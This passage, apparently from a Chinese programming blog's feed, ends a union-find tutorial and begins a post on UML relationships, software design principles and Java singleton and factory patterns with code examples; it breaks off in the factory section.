== father[u] ? u : father[u] = find(father[u]); <span class="comment">// 路径压缩</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断 u 和 v是否找到同一个根</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSame</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    u = find(u);</span><br><span class="line">    v = find(v);</span><br><span class="line">    <span class="keyword">return</span> u == v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将v-&gt;u 这条边加入并查集</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">join</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    u = find(u); <span class="comment">// 寻找u的根</span></span><br><span class="line">    v = find(v); <span class="comment">// 寻找v的根</span></span><br><span class="line">    <span class="keyword">if</span> (u == v) <span class="keyword">return</span> ; <span class="comment">// 如果发现根相同，则说明在一个集合，不用两个节点相连直接返回</span></span><br><span class="line">    father[v] = u;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="常见误区解释"><a href="#常见误区解释" class="headerlink" title="常见误区解释"></a>常见误区解释</h3><p><strong>误区：</strong><br>由于<code>isSame(int u, int v)</code>和<code>join(int u, int v)</code>中的代码似乎重复了，就用改写如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断 u 和 v是否找到同一个根</span></span><br><span class="line"><span class="function">bool <span class="title">isSame</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    u = find(u);</span><br><span class="line">    v = find(v);</span><br><span class="line">    <span class="keyword">return</span> u == v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将v-&gt;u 这条边加入并查集</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">join</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isSame(u, v)) <span class="keyword">return</span> ; <span class="comment">// 如果发现根相同，则说明在一个集合，不用两个节点相连直接返回</span></span><br><span class="line">    father[v] = u;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>结论与反例：</strong><br>首先给出结论，这样肯定不对，举出反例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">join(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">join(<span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">isSame(<span class="number">1</span>, <span class="number">3</span>);    <span class="comment">// 会发现结果是不一样的</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-12-11-16-29-44.png" alt="image-20241211162943151"></p>
<p><strong>解释：</strong><br>原因就发生在这两种不同的写法，在执行到<code>father[v] = u;</code>的时候，这个u是不一样的，在正确的写法中，这个u可能已经不是<code>join(int u, int v)</code>接收到的形参的值了；而错误写法中，<code>u</code>仍然是原来的值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">join</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    u = find(u); <span class="comment">// 寻找u的根</span></span><br><span class="line">    v = find(v); <span class="comment">// 寻找v的根</span></span><br><span class="line">    <span class="keyword">if</span> (u == v) <span class="keyword">return</span> ; </span><br><span class="line">    father[v] = u;          <span class="comment">// 此时的u可能已经不是原来的u了，因为指向了原来u所指向的根</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>UML、设计原则、23种设计模式、自定义SpringIOC全解</title>
    <url>/2024/12/05/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%81UML%E3%80%81%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%E3%80%81%E8%87%AA%E5%AE%9A%E4%B9%89SpringIOC%E5%85%A8%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="设计模式概述"><a href="#设计模式概述" class="headerlink" title="设计模式概述"></a>设计模式概述</h2><span id="more"></span>

<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-12-05-16-02-16.png" alt="设计模式"></p>
<h3 id="软件设计模式的产生背景"><a href="#软件设计模式的产生背景" class="headerlink" title="软件设计模式的产生背景"></a>软件设计模式的产生背景</h3><p>“设计模式”最初并不是出现在软件设计中，而是被用于建筑领域的设计中。</p>
<h3 id="软件设计模式的概念"><a href="#软件设计模式的概念" class="headerlink" title="软件设计模式的概念"></a>软件设计模式的概念</h3><p>软件设计模式（Software Design Pattern），又称设计模式，是一套被反复使用，多数人知晓的、经过分类编目的、代码设计经验的总结。</p>
<p>它描述了在软件设计过程中的一些不断重复发生的问题，以及该问题的解决方案。也就是说，它是解决特定问题的一系列套路，是前辈们的代码设计经验的总结，具有一定的普遍性，可以反复使用。</p>
<h3 id="社戏设计模式的必要性"><a href="#社戏设计模式的必要性" class="headerlink" title="社戏设计模式的必要性"></a>社戏设计模式的必要性</h3><p>设计模式的本质是面向对象设计原则的实际运用，是对类的封装性、继承性和多态性以及类的关联关系和组合关系的充分理解。</p>
<p>正确使用设计模式具有以下优点：</p>
<ul>
<li>可以提高程序员的思维能力、编程能力和设计能力</li>
<li>使程序设计更加标准化、代码编制更加工程化，使软件开发效率大大提高，从而缩短软件的开发周期</li>
<li>使设计的代码可重用性高、可读性强、可靠性高、灵活性好、可维护性强</li>
</ul>
<h3 id="设计模式的分类"><a href="#设计模式的分类" class="headerlink" title="设计模式的分类"></a>设计模式的分类</h3><ul>
<li>创建型模式<br>用于描述“怎样创建对象”，它的主要特点是“<strong>将对象的创建与使用分离</strong>”。GoF（四人组）书中提供了单例、原型、工厂方法、抽象工厂、建造者等5中创建型模式。</li>
<li>结构型模式<br>用于描述如何<strong>将类或对象按某种布局</strong>组成更大的结构，GoF（四人组）书中提供了代理、适配器、桥接、装饰、外观、享元、组合等7中结构模式。</li>
<li>行为型模式<br>用于描述类或<strong>对象之间</strong>怎样<strong>相互协作共同完成</strong>单个对象无法单独完成的任务，以及怎样分配职责。GoF（四人组）书中提供了模板方法、策略、命令、职责链、状态、观察者、中介者、迭代器、访问者、备忘录、解释器等11种行为型模式。</li>
</ul>
<h2 id="UML"><a href="#UML" class="headerlink" title="UML"></a>UML</h2><p>统一建模语言（Unified Modeling Language，UML），用来设计软件的可视化建模语言。能表达软件设计中的动态和静态信息。</p>
<p>UML从目标系统的不同角度除法，定义了用例图、类图、对象图、状态图、活动图、时序图、协作图、构件图、部署图等9种图。</p>
<h3 id="类图概述"><a href="#类图概述" class="headerlink" title="类图概述"></a>类图概述</h3><p>类图（Class diagram）显示了模型的静态结构，特别是模型中存在的类、类的内部结构以及他们与其他类的关系等。类图不显示暂时性的信息。类图是面显贵对象建模的主要组成部分。</p>
<h3 id="类与类之间关系的表示方式"><a href="#类与类之间关系的表示方式" class="headerlink" title="类与类之间关系的表示方式"></a>类与类之间关系的表示方式</h3><h4 id="关联关系"><a href="#关联关系" class="headerlink" title="关联关系"></a>关联关系</h4><p>关联关系是对象之间的一种引用关系，用于表示一类对象与另一类对象之间的联系，如老师和学生、师傅和徒弟、丈夫和妻子等。关联关系是类与类之间最常用的一种关系，分为一般关联关系、聚合关系和组合关系。我们先介绍一般关联。</p>
<p>关联又可以分为单向关联，双向关联，自关联。</p>
<p><strong>1、单向关联</strong></p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-39-39.png"></p>
<p>在UML类图中单向关联用一个带箭头的实线表示。上图表示每个顾客都有一个地址，这通过让Customer类持有一个类型为Address的成员变量类实现。</p>
<p><strong>2、双向关联</strong></p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-39-43.png"></p>
<p>从上图中我们很容易看出，所谓的双向关联就是双方各自持有对方类型的成员变量。</p>
<p>在UML类图中，双向关联用一个不带箭头的直线表示。上图中在Customer类中维护一个List&lt;Product&gt;，表示一个顾客可以购买多个商品；在Product类中维护一个Customer类型的成员变量表示这个产品被哪个顾客所购买。</p>
<p><strong>3、自关联</strong></p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-39-49.png"></p>
<p>自关联在UML类图中用一个带有箭头且指向自身的线表示。上图的意思就是Node类包含类型为Node的成员变量，也就是“自己包含自己”。</p>
<h4 id="聚合关系"><a href="#聚合关系" class="headerlink" title="聚合关系"></a>聚合关系</h4><p>聚合关系是关联关系的一种，是强关联关系，是整体和部分之间的关系。</p>
<p>聚合关系也是通过成员对象来实现的，其中<strong>成员对象是整体对象的一部分</strong>，但是<strong>成员对象可以脱离整体对象而独立存在</strong>。例如，学校与老师的关系，学校包含老师，但如果学校停办了，老师依然存在。</p>
<p>在 UML 类图中，聚合关系可以用带空心菱形的实线来表示，菱形指向整体。下图所示是大学和教师的关系图：</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-39-56.png"></p>
<h4 id="组合关系"><a href="#组合关系" class="headerlink" title="组合关系"></a>组合关系</h4><p>组合表示类之间的整体与部分的关系，但它是一种更强烈的聚合关系。</p>
<p>在组合关系中，<strong>整体对象可以控制部分对象的生命周期，一旦整体对象不存在，部分对象也将不存在，部分对象不能脱离整体对象而存在</strong>。例如，头和嘴的关系，没有了头，嘴也就不存在了。</p>
<p>在 UML 类图中，组合关系用带实心菱形的实线来表示，菱形指向整体。下图所示是头和嘴的关系图：</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-40-03.png"></p>
<h4 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h4><p>依赖关系是一种使用关系，它是对象之间<strong>耦合度最弱</strong>的一种关联方式，是<strong>临时性的关联</strong>。在代码中，<strong>某个类的方法通过局部变量、方法的参数或者对静态方法的调用来访问另一个类（被依赖类）中的某些方法</strong>来完成一些职责。</p>
<p>在 UML 类图中，依赖关系使用带箭头的虚线来表示，箭头从使用类指向被依赖的类。下图所示是司机和汽车的关系图，司机驾驶汽车：</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-40-08.png"></p>
<h4 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h4><p>继承关系是对象之间<strong>耦合度最大</strong>的一种关系，<strong>表示一般与特殊的关系</strong>，是<strong>父类与子类之间的关系</strong>，是一种继承关系。</p>
<p>在 UML 类图中，泛化关系用带空心三角箭头的实线来表示，箭头从子类指向父类。在代码实现时，使用面向对象的继承机制来实现泛化关系。例如，Student 类和 Teacher 类都是 Person 类的子类，其类图如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-40-13.png"></p>
<h4 id="实现关系"><a href="#实现关系" class="headerlink" title="实现关系"></a>实现关系</h4><p>实现关系<strong>是接口与实现类之间的关系</strong>。在这种关系中，类实现了接口，类中的操作实现了接口中所声明的所有的抽象操作。</p>
<p>在 UML 类图中，实现关系使用带空心三角箭头的虚线来表示，箭头从实现类指向接口。例如，汽车和船实现了交通工具，其类图如图 9 所示。</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-39-17.png"></p>
<h2 id="软件设计原则"><a href="#软件设计原则" class="headerlink" title="软件设计原则"></a>软件设计原则</h2><h3 id="开闭原则"><a href="#开闭原则" class="headerlink" title="开闭原则"></a>开闭原则</h3><p>程序需要拓展的时候，不能修改原有代码，实现<strong>热插拔</strong>效果</p>
<p><strong>对扩展开放，对修改关闭</strong></p>
<h3 id="里氏代换原则"><a href="#里氏代换原则" class="headerlink" title="里氏代换原则"></a>里氏代换原则</h3><p>子类可以扩展弗雷的功能，但不能改变父类原有的功能</p>
<p><strong>任何基类可以出现的地方，子类一定可以出现</strong></p>
<h3 id="依赖倒转原则"><a href="#依赖倒转原则" class="headerlink" title="依赖倒转原则"></a>依赖倒转原则</h3><p>对抽象进行编程，不要对实现进行编程</p>
<p><strong>抽象不应该依赖细节，细节应该依赖抽象</strong></p>
<h3 id="接口隔离原则"><a href="#接口隔离原则" class="headerlink" title="接口隔离原则"></a>接口隔离原则</h3><p>一个类对另一个类的依赖应该建立在最小的接口上，客户端不应该被迫依赖于它不使用的方法</p>
<p><strong>大接口尽量解耦成多个小接口</strong></p>
<h3 id="迪米特法则"><a href="#迪米特法则" class="headerlink" title="迪米特法则"></a>迪米特法则</h3><p>又叫最少知识原则</p>
<p><strong>如果两个软件实体无需直接通信，就不应该发生直接的相互调用，可以通过第三方（代理）转发该调用</strong></p>
<h3 id="合成复用原则"><a href="#合成复用原则" class="headerlink" title="合成复用原则"></a>合成复用原则</h3><p><strong>尽量先使用组合或者聚合等关联关系来实现，其次才考虑使用继承关系来实现</strong></p>
<h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><h3 id="创建者模式"><a href="#创建者模式" class="headerlink" title="创建者模式"></a>创建者模式</h3><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><p>单例设计模式分类两种：</p>
<ul>
<li>饿汉式：类加载就会导致该单实例对象被创建    </li>
<li>懒汉式：类加载不会导致该单实例对象被创建，而是首次使用该对象时才会创建</li>
</ul>
<p><strong>线程安全不安全标准：</strong></p>
<ul>
<li><strong>对象是否被多次实例化</strong></li>
<li><strong>实例对象是否一致（即对象是否不是完整的对象）</strong></li>
</ul>
<h5 id="饿汉式-方式1（静态变量方式）"><a href="#饿汉式-方式1（静态变量方式）" class="headerlink" title="饿汉式-方式1（静态变量方式）"></a>饿汉式-方式1（静态变量方式）</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 饿汉式</span></span><br><span class="line"><span class="comment"> *      静态变量创建类的对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">//私有构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在成员位置创建该类的对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对外提供静态方法获取该对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<p>​    该方式在成员位置声明Singleton类型的静态变量，并创建Singleton类的对象instance。instance对象是随着类的加载而创建的。如果该对象足够大的话，而一直没有使用就会造成内存的浪费。</p>
<h5 id="饿汉式-方式2（静态代码块方式）"><a href="#饿汉式-方式2（静态代码块方式）" class="headerlink" title="饿汉式-方式2（静态代码块方式）"></a>饿汉式-方式2（静态代码块方式）</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 恶汉式</span></span><br><span class="line"><span class="comment"> *      在静态代码块中创建该类对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//私有构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在成员位置创建该类的对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对外提供静态方法获取该对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<p>​    该方式在成员位置声明Singleton类型的静态变量，而对象的创建是在静态代码块中，也是对着类的加载而创建。所以和饿汉式的方式1基本上一样，当然该方式也存在内存浪费问题。</p>
<h5 id="懒汉式-方式1（线程不安全）"><a href="#懒汉式-方式1（线程不安全）" class="headerlink" title="懒汉式-方式1（线程不安全）"></a>懒汉式-方式1（<strong>线程不安全</strong>）</h5><p>问题：可能多次实例化（线程不安全）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 懒汉式</span></span><br><span class="line"><span class="comment"> *  线程不安全</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">//私有构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在成员位置创建该类的对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对外提供静态方法获取该对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<p>​    从上面代码我们可以看出该方式在成员位置声明Singleton类型的静态变量，并没有进行对象的赋值操作，那么什么时候赋值的呢？当调用getInstance()方法获取Singleton类的对象的时候才创建Singleton类的对象，这样就实现了懒加载的效果。但是，如果是多线程环境，会出现线程安全问题。</p>
<h5 id="懒汉式-方式2（线程安全-synchronized）"><a href="#懒汉式-方式2（线程安全-synchronized）" class="headerlink" title="懒汉式-方式2（线程安全 synchronized）"></a>懒汉式-方式2（<strong>线程安全</strong> synchronized）</h5><p>问题：性能不够优</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 懒汉式</span></span><br><span class="line"><span class="comment"> *  线程安全</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">//私有构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在成员位置创建该类的对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对外提供静态方法获取该对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<p>​    该方式也实现了懒加载效果，同时又解决了线程安全问题。但是在<code>getInstance()</code>方法上添加了**<code>synchronized</code>**关键字，导致该方法的执行效果特别低。从上面代码我们可以看出，其实就是在初始化instance的时候才会出现线程安全问题，一旦初始化完成就不存在了。</p>
<h5 id="懒汉式-方式3（双重检查锁-synchronized-volatile-）"><a href="#懒汉式-方式3（双重检查锁-synchronized-volatile-）" class="headerlink" title="懒汉式-方式3（双重检查锁 synchronized + volatile ）"></a>懒汉式-方式3（<strong>双重检查锁</strong> synchronized + volatile ）</h5><p>再来讨论一下懒汉模式中加锁的问题，对于 <code>getInstance()</code> 方法来说，绝大部分的操作都是读操作，读操作是线程安全的，所以我们没必让每个线程必须持有锁才能调用该方法，我们需要调整加锁的时机。由此也产生了一种新的实现模式：双重检查锁模式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 双重检查方式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123; </span><br><span class="line"></span><br><span class="line">    <span class="comment">//私有构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton instance;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//对外提供静态方法获取该对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">//第一次判断，如果instance不为null，不进入抢锁阶段，直接返回实例</span></span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="comment">//抢到锁之后再次判断是否为null</span></span><br><span class="line">                <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双重检查锁模式是一种非常好的单例实现模式，解决了单例、性能、线程安全问题，上面的双重检测锁模式看上去完美无缺，其实是存在问题，在多线程的情况下，可能会出现空指针问题，出现问题的原因是JVM在实例化对象的时候会进行优化和<strong>指令重排序</strong>操作（<strong>导致成员变量未被完全初始化，即只是半个对象</strong>）。</p>
<p>问题：可能对象不完整（即实例对象不一致，属于线程不安全）</p>
<p>要解决双重检查锁模式带来空指针异常的问题，只需要使用 <code>volatile</code> 关键字, <code>volatile</code> 关键字可以保证可见性和有序性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 双重检查方式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//私有构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//对外提供静态方法获取该对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">//第一次判断，如果instance不为null，不进入抢锁阶段，直接返回实际</span></span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="comment">//抢到锁之后再次判断是否为空</span></span><br><span class="line">                <span class="keyword">if</span>(instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>小结：</strong></p>
<p>添加 <code>volatile</code> 关键字之后的双重检查锁模式是一种比较好的单例实现模式，能够保证在多线程的情况下线程安全也不会有性能问题。</p>
<h5 id="懒汉式-方式4（静态内部类方式）"><a href="#懒汉式-方式4（静态内部类方式）" class="headerlink" title="懒汉式-方式4（静态内部类方式）"></a>懒汉式-方式4（静态内部类方式）</h5><p>静态内部类单例模式中实例由内部类创建，由于 <strong>JVM 在加载外部类的过程中, 是不会加载静态内部类的, 只有内部类的属性/方法被调用时才会被加载, 并初始化其静态属性</strong>。静态属性由于被 <code>static</code> 修饰，保证只被实例化一次，并且严格保证实例化顺序。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 静态内部类方式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//私有构造方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对外提供静态方法获取该对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<p>​    第一次加载Singleton类时不会去初始化INSTANCE，只有第一次调用getInstance，虚拟机加载SingletonHolder</p>
<p>并初始化INSTANCE，这样不仅能确保线程安全，也能保证 Singleton 类的唯一性。</p>
<p><strong>小结：</strong></p>
<p>​    静态内部类单例模式是一种优秀的单例模式，是开源项目中比较常用的一种单例模式。在没有加任何锁的情况下，保证了多线程下的安全，并且没有任何性能影响和空间的浪费。</p>
<h5 id="枚举方式"><a href="#枚举方式" class="headerlink" title="枚举方式"></a>枚举方式</h5><p>枚举类实现单例模式是极力推荐的单例实现模式，因为枚举类型是线程安全的，并且只会装载一次，设计者充分的利用了枚举的这个特性来实现单例模式，枚举的写法非常简单，而且枚举类型是所用单例实现中唯一一种不会被破坏的单例实现模式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 枚举方式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明：</strong></p>
<p>​    枚举方式属于恶汉式方式。</p>
<h4 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h4><p>设计一个咖啡类（Coffee），并定义其两个子类（美式咖啡【AmericanCoffee】和拿铁咖啡【LatteCoffee】）；再设计一个咖啡店类（CoffeeStore），咖啡店具有点咖啡的功能。</p>
<p>具体类的设计如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-40-26.png" style="zoom:80%;" />

<p>在java中，万物皆对象，这些对象都需要创建，如果创建的时候直接new该对象，就会对该对象耦合严重，假如我们要更换对象，所有new对象的地方都需要修改一遍，这显然<strong>违背开闭原则</strong>。</p>
<p>如果我们使用工厂来生产对象，我们就只和工厂打交道就可以了，彻底和对象解耦，如果要更换对象，直接在工厂里更换该对象即可，达到了与对象解耦的目的；所以说，工厂模式最大的优点就是：<strong>解耦</strong>。</p>
<h5 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h5><p>简单工厂<strong>不是一种设计模式</strong>，反而比较像是一种编程习惯。</p>
<p><strong>结构</strong></p>
<p>简单工厂包含如下角色：</p>
<ul>
<li>抽象产品 ：定义了产品的规范，描述了产品的主要特性和功能。</li>
<li>具体产品 ：实现或者继承抽象产品的子类</li>
